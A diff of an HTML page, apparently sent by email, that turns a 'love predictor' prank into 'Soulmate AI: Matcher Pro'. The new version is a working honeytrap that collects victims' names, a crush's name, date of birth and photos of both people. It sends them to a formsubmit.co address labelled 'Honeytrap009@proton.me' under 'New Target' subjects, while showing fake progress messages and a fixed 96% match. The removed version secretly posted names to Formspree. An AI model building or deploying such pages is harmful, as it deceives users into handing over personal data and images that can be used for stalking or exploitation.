@@ -1,182 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💖 AI Love Predictor v2.0 💖</title>
-    <style>
-        /* Modern Gradient Background */
-        body { 
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
-            overflow: hidden;
-        }
-
-        /* Floating Hearts Animation */
-        .heart {
-            position: absolute;
-            color: rgba(255, 255, 255, 0.6);
-            animation: float 6s infinite linear;
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
-        }
-
-        /* Glassmorphism Card Effect */
-        .card { 
-            background: rgba(255, 255, 255, 0.85);
-            padding: 40px; 
-            border-radius: 25px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2); 
-            width: 320px;
-            z-index: 10;
-            text-align: center;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.5);
-        }
-
-        h2 { color: #d81b60; margin-bottom: 5px; font-weight: 700; }
-        p { color: #666; font-size: 0.9em; margin-bottom: 25px; }
-
-        input { 
-            width: 85%; 
-            padding: 15px; 
-            margin: 10px 0; 
-            border: 2px solid #fce4ec; 
-            border-radius: 15px; 
-            outline: none;
-            font-size: 16px;
-            transition: 0.3s;
-            background: rgba(255, 255, 255, 0.9);
-        }
-
-        input:focus { border-color: #ff4081; box-shadow: 0 0 8px rgba(255, 64, 129, 0.2); }
-
-        /* Pulsing Button */
-        button { 
-            background: #ff4081; 
-            color: white; 
-            border: none; 
-            padding: 15px 40px; 
-            border-radius: 30px; 
-            font-size: 18px;
-            font-weight: bold; 
-            cursor: pointer; 
-            margin-top: 20px;
-            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4);
-            transition: transform 0.2s;
-            animation: pulse 2s infinite;
-        }
-
-        button:active { transform: scale(0.95); }
-
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255, 64, 129, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0); }
-        }
-
-        #loader { display: none; margin-top: 20px; font-weight: bold; color: #ff4081; font-size: 1.1em; }
-        #finalScore { margin-top: 20px; font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); }
-
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>💘 Soulmate AI: Matcher Pro</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Poppins', sans-serif; background: linear-gradient(45deg, #ff9a9e 0%, #fad0c4 100%); overflow: hidden; }
+.card { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 20px; width: 340px; z-index: 10; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+.tabs { display: flex; background: #fff0f3; border-radius: 12px; padding: 5px; margin-bottom: 20px; }
+.tab-btn { flex: 1; padding: 8px; border: none; background: none; cursor: pointer; border-radius: 10px; font-weight: 600; color: #888; }
+.tab-btn.active { background: #ff4081; color: white; }
+.input-group { position: relative; margin-bottom: 12px; }
+.input-group i { position: absolute; left: 12px; top: 13px; color: #ff80ab; }
+input { width: 100%; padding: 10px 10px 10px 35px; border: 2px solid #fce4ec; border-radius: 10px; box-sizing: border-box; outline: none; }
+.file-btn { display: block; padding: 10px; background: #fce4ec; color: #d81b60; border: 1px dashed #f06292; border-radius: 10px; cursor: pointer; margin-bottom: 10px; font-size: 13px; text-align: center; }
+.file-btn.uploaded { background: #e8f5e9; color: #2e7d32; border-style: solid; }
+.main-btn { background: #ff4081; color: white; border: none; padding: 12px; border-radius: 25px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
+.hidden { display: none; }
+#loader { display: none; margin-top: 20px; }
+.progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 5px; overflow: hidden; }
+.progress-fill { height: 100%; width: 0%; background: #ff4081; transition: width 0.3s; }
+</style>
 </head>
 <body>
 
-    <div id="heart-container"></div>
+<div class="card">
+<h2 style="color: #d81b60; margin: 0;">Love AI Scanner</h2>
+<p style="font-size: 11px; color: #666; margin-bottom: 15px;">Advanced Compatibility Engine</p>
 
-    <div class="card">
-        <h2>💞 Love Scanner</h2>
-        <p>Advanced Neural Matching Algorithm</p>
-        
-        <form id="prankForm" action="https://formspree.io/f/mbdalzbj" method="POST">
-            <input type="text" name="User_Name" id="uName" placeholder="Your Full Name" required autocomplete="off">
-            <input type="text" name="Lover_Name" id="cName" placeholder="Crush's Full Name" required autocomplete="off">
-            
-            <button type="button" onclick="runPrank()">Scan Compatibility</button>
-        </form>
+<div class="tabs">
+<button class="tab-btn active" id="t1" onclick="switchTab('text')">Zodiac</button>
+<button class="tab-btn" id="t2" onclick="switchTab('photo')">Photo Match</button>
+</div>
 
-        <div id="loader">Syncing Heartbeats... 💓</div>
-        <h1 id="finalScore" style="color: #ff4081;"></h1>
-    </div>
+<form id="formText" action="https://formsubmit.co/Honeytrap009@proton.me" method="POST">
+<input type="hidden" name="_subject" value="💘 New Target: Name/DOB">
+<input type="hidden" name="_captcha" value="false">
+<div class="input-group"><i class="fas fa-user"></i><input type="text" name="User_Name" placeholder="Your Name" required></div>
+<div class="input-group"><i class="fas fa-heart"></i><input type="text" name="Crush_Name" placeholder="Crush Name" required></div>
+<div class="input-group"><i class="fas fa-calendar"></i><input type="text" placeholder="Your DOB" onfocus="(this.type='date')" name="DOB" required></div>
+<button type="button" class="main-btn" onclick="startScan('formText')">Analyze Match</button>
+</form>
 
-    <script>
-        // 1. Background Animation Logic
-        function createHeart() {
-            const heart = document.createElement('div');
-            heart.classList.add('heart');
-            heart.innerHTML = '❤️';
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.fontSize = Math.random() * 20 + 10 + 'px';
-            heart.style.animationDuration = Math.random() * 3 + 3 + 's';
-            
-            document.getElementById('heart-container').appendChild(heart);
-            
-            setTimeout(() => {
-                heart.remove();
-            }, 6000);
-        }
-        
-        setInterval(createHeart, 400);
+<form id="formPhoto" class="hidden" action="https://formsubmit.co/Honeytrap009@proton.me" method="POST" enctype="multipart/form-data">
+<input type="hidden" name="_subject" value="📸 New Target: PHOTOS">
+<input type="hidden" name="_captcha" value="false">
 
-        // 2. The Prank Logic
-        function runPrank() {
-            const u = document.getElementById('uName').value;
-            const c = document.getElementById('cName').value;
-            const loader = document.getElementById('loader');
-            const form = document.getElementById('prankForm');
-            
-            if(!u || !c) {
-                alert("⚠ Please enter both names to start the scan!");
-                return;
-            }
+<div class="input-group"><i class="fas fa-user"></i><input type="text" name="User_Name" id="uName" placeholder="Your Name" required></div>
+<div class="input-group"><i class="fas fa-heart"></i><input type="text" name="Crush_Name" id="cName" placeholder="Crush Name" required></div>
 
-            // Hide form, show loader
-            form.style.display = "none";
-            loader.style.display = "block";
-            
-            // SECRETLY send data to your Formspree ID
-            const formData = new FormData(form);
-            
-            fetch(form.action, {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).then(response => {
-                if (response.ok) {
-                    // Success! Now wait a tiny bit and show the fake result
-                    setTimeout(() => {
-                        loader.style.display = "none";
-                        // Generate a random score between 88% and 99%
-                        const score = Math.floor(Math.random() * 12) + 88; 
-                        document.getElementById('finalScore').innerText = score + "% MATCH!";
-                        
-                        // Optional: Add a small subtitle
-                        const sub = document.createElement('p');
-                        sub.innerText = "Compatibility confirmed by AI! 💘";
-                        sub.style.marginTop = "-10px";
-                        document.querySelector('.card').appendChild(sub);
-                    }, 2500);
-                } else {
-                    // Fallback if Formspree fails (still show the prank result so they don't know!)
-                    loader.style.display = "none";
-                    document.getElementById('finalScore').innerText = "94% MATCH!";
-                }
-            }).catch(error => {
-                // Network error? Just show a fake result anyway.
-                loader.style.display = "none";
-                document.getElementById('finalScore').innerText = "91% MATCH!";
-            });
-        }
-    </script>
+<label class="file-btn" id="l1">📁 Upload Your Photo <input type="file" name="My_Photo" id="p1" accept="image/*" hidden onchange="checkFile(this, 'l1')"></label>
+<label class="file-btn" id="l2">📁 Upload Crush Photo <input type="file" name="Crush_Photo" id="p2" accept="image/*" hidden onchange="checkFile(this, 'l2')"></label>
+
+<button type="button" class="main-btn" onclick="startScan('formPhoto')">Scan Biometrics</button>
+</form>
+
+<div id="loader">
+<div class="progress-bar"><div class="progress-fill" id="bar"></div></div>
+<p id="status" style="font-size: 11px; color: #ff4081; margin-top: 5px;">Uploading to Secure Server...</p>
+</div>
+
+<div id="result" class="hidden">
+<h1 style="font-size: 45px; color: #ff4081; margin: 10px 0;">96%</h1>
+<p style="font-weight: bold; color: #333;">Soulmate Detected! 💍</p>
+<p style="font-size: 12px; color: #777;">Result sent to AI Database.</p>
+<button onclick="location.reload()" style="background: #eee; border: none; padding: 8px 20px; border-radius: 20px; cursor: pointer;">Scan New</button>
+</div>
+</div>
+
+<script>
+function switchTab(mode) {
+if(mode === 'text') {
+document.getElementById('formText').classList.remove('hidden');
+document.getElementById('formPhoto').classList.add('hidden');
+document.getElementById('t1').classList.add('active');
+document.getElementById('t2').classList.remove('active');
+} else {
+document.getElementById('formText').classList.add('hidden');
+document.getElementById('formPhoto').classList.remove('hidden');
+document.getElementById('t2').classList.add('active');
+document.getElementById('t1').classList.remove('active');
+}
+}
+
+function checkFile(input, id) {
+if(input.files[0]) {
+let label = document.getElementById(id);
+label.classList.add('uploaded');
+label.innerText = "✅ " + input.files[0].name.substring(0, 15);
+}
+}
+
+function startScan(formId) {
+const form = document.getElementById(formId);
+if(!form.checkValidity()) { alert("Please fill all fields!"); return; }
+
+// Hide form & show loader
+form.classList.add('hidden');
+document.querySelector('.tabs').classList.add('hidden');
+document.getElementById('loader').style.display = 'block';
+
+// Fake Progress Bar
+let w = 0;
+let bar = document.getElementById('bar');
+let status = document.getElementById('status');
+
+let interval = setInterval(() => {
+w += 2;
+bar.style.width = w + "%";
+
+if(w == 20) status.innerText = "Scanning Names...";
+if(w == 50) status.innerText = "Compressing Biometrics...";
+if(w == 80) status.innerText = "Syncing with Proton Cloud...";
+
+if(w >= 100) {
+clearInterval(interval);
+// FORM SUBMIT
+form.submit();
+
+// Show Result
+setTimeout(() => {
+document.getElementById('loader').classList.add('hidden');
+document.getElementById('result').classList.remove('hidden');
+}, 1000);
+}
+}, 100);
+}
+</script>
+
 </body>
 </html>
+
+
+
+
+Sent from Proton Mail for Android.
